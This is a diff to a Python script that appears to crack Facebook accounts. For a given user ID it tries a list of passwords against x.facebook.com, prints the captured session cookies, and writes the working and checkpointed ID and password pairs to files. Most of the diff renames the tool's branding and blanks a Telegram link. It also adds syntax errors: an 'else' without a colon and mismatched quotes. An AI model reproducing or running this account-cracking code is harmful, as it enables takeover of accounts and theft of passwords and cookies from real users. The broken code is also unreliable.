@@ -635,7 +635,7 @@ def my_facebook(uid, pwx):
         for ps in pwx:
             session = requests.Session()
             loop+=1
-            sys.stdout.write(f'\r{WHITE}[MORTEZA-KING 👑] [%s] {WHITE}[{GREEN}OK:%s{WHITE}/{YELLOW}CP:%s{WHITE}]'%(loop,len(ok),len(cp))),
+            sys.stdout.write(f'\r{WHITE}[AZVI GEIOR 🌟] [%s] {WHITE}[{GREEN}OK:%s{WHITE}/{YELLOW}CP:%s{WHITE}]'%(loop,len(ok),len(cp))),
             sys.stdout.flush()
 
             free = session.get("https://x.facebook.com", allow_redirects=False).text
@@ -673,22 +673,22 @@ def my_facebook(uid, pwx):
                 cooki = ';'.join([key+'='+value for key,value in session.cookies.get_dict().items()])
                 sep = cooki.split("1000")[1]
                 cid = "1000"+sep[0:11]
-                print(f'\r{GREEN}[MORTAZA-OK 😍] {cid} | {ps}')
+                print(f'\r{GREEN}[AZVI-OK 😍] {cid} | {ps}')
                 print(f'\r{YELLOW}[COOKIES 🍪] {cooki}')
                 if os.name == "nt":
-                    open('MORTAZA-OK.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); ok.append(cid)
-                else:
-                    open('/sdcard/MORTAZA-OK.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); ok.append(cid)
+                    open('AZVI-OK.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); ok.append(cid)
+                else
+                    open('/sdcard/AZVI-OK.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); ok.append(cid)
 
             elif "checkpoint" in  log_cookies:
                 cooki = ';'.join([key+'='+value for key,value in session.cookies.get_dict().items()])
                 sep = cooki.split("1000")[1]
                 cid = "1000"+sep[0:11]
-                print(f'\r{RED}[MORTAZA-CP 💔] {cid} | {ps}')
+                print(f'\r{RED}[AZVI-CP 🚫] {cid} | {ps}')
                 if os.name == "nt":
-                    open('MORTAZA-CP.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); cp.append(cid)
+                    open("AZVI-CP.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); cp.append(cid)
                 else:
-                    open('/sdcard/MORTAZA-CP.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); cp.append(cid)
+                    open('/sdcard/AZVI-CP.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); cp.append(cid)
             else:
                 pass
 	
@@ -713,9 +713,9 @@ def main():
         start()
     elif c in ['02', '2']:
         if os.name == 'nt':
-            os.system('start http://t.me/black-mafia-007')
+            os.system('start http://t.me/')
         else:
-            os.system('xdg-open http://t.me/black-mafia-007')
+            os.system('xdg-open http://t.me/')
     elif c in ['00', '0']:
         if os.name == 'nt':
             os.system('cls')
